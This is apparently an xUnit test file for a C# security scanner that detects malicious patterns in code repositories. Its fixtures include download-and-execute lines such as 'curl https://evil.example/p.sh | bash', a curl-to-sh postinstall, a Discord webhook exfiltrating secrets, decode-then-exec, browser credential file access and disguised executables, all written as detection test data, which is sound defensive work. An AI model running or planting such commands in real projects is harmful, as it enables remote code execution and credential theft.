using LintelAI.Models;
using LintelAI.Services.Security;
using Xunit;

namespace LintelAI.Tests;

public sealed class SecurityScannerTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "lintel-sec-" + Guid.NewGuid().ToString("N"));

    public SecurityScannerTests() => Directory.CreateDirectory(_root);

    public void Dispose()
    {
        try { Directory.Delete(_root, recursive: true); } catch { }
    }

    private void Write(string relative, string content)
    {
        var full = Path.Combine(_root, relative.Replace('/', Path.DirectorySeparatorChar));
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, content);
    }

    private Task<SecurityReport> ScanAsync() => new SecurityScanner().ScanAsync(_root);

    private static IEnumerable<Issue> Issues(SecurityReport report) => report.Files.SelectMany(f => f.Issues);

    [Fact]
    public async Task Ordinary_project_is_clean()
    {
        Write("src/app.js", "const total = items.reduce((a, b) => a + b, 0);\nconsole.log(total);\n");
        Write("README.md", "Install with: curl https://example.com/install.sh | sh\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Empty(report.Files);
        Assert.Equal(2, report.FilesScanned);
    }

    [Fact]
    public async Task Download_and_execute_is_dangerous_and_reports_the_line()
    {
        Write("install.sh", "#!/bin/sh\necho hi\ncurl -s https://evil.example/p.sh | bash\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
        var issue = Assert.Single(Issues(report), i => i.Type == "Download and execute");
        Assert.Equal(3, issue.Line);
        Assert.Equal(Severity.High, issue.Severity);
    }

    [Fact]
    public async Task Discord_webhook_is_flagged()
    {
        Write("a.py", "requests.post('https://discord.com/api/webhooks/123/abc', data=secrets)\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
        Assert.Contains(Issues(report), i => i.Type == "Discord / Telegram exfiltration");
    }

    [Fact]
    public async Task Decode_then_execute_is_flagged()
    {
        Write("a.py", "exec(base64.b64decode('cHJpbnQoMSk='))\n");

        Assert.Contains(Issues(await ScanAsync()), i => i.Type == "Decode then execute");
    }

    [Fact]
    public async Task Prose_in_comments_is_not_a_finding()
    {
        Write("imgui.cpp",
            "    //  - OpenPopupXXX() functions return true when the popup is toggled open, which allows you to capture local state if needed.\n" +
            "    // curl https://example.com/install.sh | sh\n" +
            "    /* Login Data and Local State are Chrome files */\n" +
            "    * Local State of the widget\n" +
            "# Local State and curl x | bash\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Empty(report.Files);
    }

    [Fact]
    public async Task Lowercase_prose_in_code_is_not_browser_theft()
    {
        Write("a.cs", "var message = \"restore local state and login data\";\n");

        Assert.Empty((await ScanAsync()).Files);
    }

    [Fact]
    public async Task Real_browser_file_access_is_still_caught()
    {
        Write("steal.py", "p = os.path.join(base, \"Local State\")\n");

        Assert.Contains(Issues(await ScanAsync()), i => i.Type == "Browser data theft");
    }

    [Fact]
    public async Task Method_calls_named_exec_or_eval_are_not_payloads()
    {
        Write("a.js", "const m = re.exec(base64Text);\n");
        Write("b.py", "model.eval()\n");

        Assert.Empty((await ScanAsync()).Files);
    }

    [Fact]
    public async Task Game_input_polling_specific_keys_is_clean()
    {
        Write("game.cpp",
            "if (GetAsyncKeyState(VK_SHIFT) & 0x8000) speed *= 2.5f;\n" +
            "if (isForeground && (GetAsyncKeyState(VK_RBUTTON) & 0x8000)) orbit();\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Empty(report.Files);
    }

    [Fact]
    public async Task Global_keyboard_hook_is_suspicious()
    {
        Write("hook.cpp", "HHOOK h = SetWindowsHookExW(WH_KEYBOARD_LL, proc, nullptr, 0);\n");

        Assert.Equal(RiskVerdict.Suspicious, (await ScanAsync()).Verdict);
    }

    [Fact]
    public async Task Polling_every_key_is_only_a_low_finding()
    {
        Write("k.cpp", "for (int key = 8; key < 256; key++) if (GetAsyncKeyState(key)) log(key);\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Contains(Issues(report), i => i.Type == "Key state polling");
    }

    [Fact]
    public async Task Plain_eval_is_only_a_low_finding()
    {
        Write("a.js", "const x = eval('1 + 1');\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Contains(Issues(report), i => i.Severity == Severity.Low);
    }

    [Fact]
    public async Task Postinstall_that_downloads_is_dangerous()
    {
        Write("package.json", "{\n  \"scripts\": {\n    \"postinstall\": \"curl https://x.example/a | sh\"\n  }\n}\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
        var issue = Assert.Single(Issues(report), i => i.Type == "Suspicious install script");
        Assert.Equal(3, issue.Line);
    }

    [Fact]
    public async Task Common_prepare_scripts_are_left_alone()
    {
        Write("package.json", "{ \"scripts\": { \"prepare\": \"husky install\", \"test\": \"jest\" } }");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Empty(report.Files);
    }

    [Fact]
    public async Task Other_install_scripts_are_suspicious_not_dangerous()
    {
        Write("package.json", "{ \"scripts\": { \"postinstall\": \"node scripts/setup.js\" } }");

        Assert.Equal(RiskVerdict.Suspicious, (await ScanAsync()).Verdict);
    }

    [Fact]
    public async Task Vscode_task_that_runs_on_folder_open_is_dangerous()
    {
        Write(".vscode/tasks.json", "{ \"tasks\": [ { \"runOptions\": { \"runOn\": \"folderOpen\" } } ] }");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
    }

    [Fact]
    public async Task Setup_py_with_custom_install_that_runs_commands_is_dangerous()
    {
        Write("setup.py", "from setuptools import setup\nimport os\nclass X:\n    def run(self): os.system('id')\nsetup(cmdclass={'install': X})\n");

        Assert.Equal(RiskVerdict.Dangerous, (await ScanAsync()).Verdict);
    }

    [Fact]
    public async Task Build_event_with_powershell_is_dangerous()
    {
        Write("app.csproj", "<Project>\n  <Target Name=\"X\">\n    <Exec Command=\"powershell -c iwr http://a.example\" />\n  </Target>\n</Project>\n");

        var report = await ScanAsync();

        Assert.Contains(Issues(report), i => i.Type == "Suspicious build step" && i.Line == 3);
    }

    [Fact]
    public async Task Executable_hiding_behind_an_image_extension_is_dangerous()
    {
        File.WriteAllBytes(Path.Combine(_root, "logo.png"), [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00]);

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
        Assert.Contains(Issues(report), i => i.Type.StartsWith("Executable disguised"));
        Assert.Equal(1, report.BinaryFiles);
    }

    [Fact]
    public async Task Plain_exe_is_suspicious()
    {
        File.WriteAllBytes(Path.Combine(_root, "tool.exe"), [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00]);

        Assert.Equal(RiskVerdict.Suspicious, (await ScanAsync()).Verdict);
    }

    [Fact]
    public async Task Double_extension_is_dangerous()
    {
        Write("invoice.pdf.exe", "not really a binary");

        Assert.Contains(Issues(await ScanAsync()), i => i.Type == "Double file extension");
    }

    [Fact]
    public async Task Bidi_control_characters_are_dangerous()
    {
        Write("a.js", "if (isAdmin) { // \u202E check\n}\n");

        Assert.Contains(Issues(await ScanAsync()), i => i.Type == "Hidden Unicode control characters");
    }

    [Fact]
    public async Task Large_encoded_blob_is_suspicious()
    {
        Write("a.js", "const p = '" + new string('A', 400) + "';\n");

        var report = await ScanAsync();

        Assert.Equal(RiskVerdict.Suspicious, report.Verdict);
        Assert.Contains(Issues(report), i => i.Type == "Large encoded blob");
    }

    [Fact]
    public async Task Image_data_uris_are_not_blobs()
    {
        Write("a.css", "x{background:url(data:image/png;base64," + new string('A', 400) + ")}\n");
        Write("b.js", "const i = 'data:image/png;base64," + new string('A', 400) + "';\n");

        Assert.Equal(RiskVerdict.Clean, (await ScanAsync()).Verdict);
    }

    [Fact]
    public async Task AIIgnore_is_not_honoured_because_the_project_cannot_vouch_for_itself()
    {
        Write(".AIIgnore", "evil.sh\n");
        Write("evil.sh", "curl https://x.example/a | sh\n");

        Assert.Equal(RiskVerdict.Dangerous, (await ScanAsync()).Verdict);
    }

    [Fact]
    public async Task Env_files_and_binaries_are_scanned_but_node_modules_is_reported_as_skipped()
    {
        Write("node_modules/pkg/index.js", "eval('x')\n");
        Write(".env", "TOKEN=abc\n");

        var report = await ScanAsync();

        Assert.Equal(1, report.FilesScanned);
        Assert.Contains("node_modules/", report.Skipped);
    }

    [Fact]
    public async Task Honours_cancellation()
    {
        Write("a.js", "x");
        using var cts = new CancellationTokenSource();
        cts.Cancel();

        await Assert.ThrowsAnyAsync<OperationCanceledException>(
            () => new SecurityScanner().ScanAsync(_root, null, cts.Token));
    }
}
